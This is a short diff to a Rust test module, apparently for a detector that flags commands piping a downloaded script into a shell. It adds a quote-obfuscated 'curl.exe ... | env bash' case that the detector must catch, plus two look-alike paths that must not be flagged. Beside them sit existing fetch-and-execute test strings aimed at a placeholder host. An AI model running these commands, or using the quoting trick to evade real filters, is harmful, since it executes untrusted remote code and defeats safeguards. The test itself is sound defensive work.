@@ -593,6 +593,7 @@ mod tests {
             // A Windows path: removing backslashes joins `curl` to its folder.
             r#""C:\Windows\System32\curl.exe" https://x/i | env bash"#,
             r"C:\Windows\System32\curl.exe https://x/i | env bash",
+            r"C:\Windows\System32\c'url'.exe https://x/i | env bash",
         ] {
             assert!(hits(command), "not caught: {command:?}");
         }
@@ -608,6 +609,9 @@ mod tests {
             "curl https://example.com/data.json | jq .name",
             "wget https://example.com/file.tar.gz | tar xz",
             "curl https://example.com | grep sha256",
+            // A folder named like a fetch tool is not the fetch tool.
+            r#""C:\curl\helper.exe" https://x/i | env bash"#,
+            "/opt/wget/helper https://x/i | env bash",
             "wget https://example.com | shasum -a 256",
             "curl https://example.com/install | shellcheck -",
             "curl https://example.com/key | sudo tee keyring.gpg",
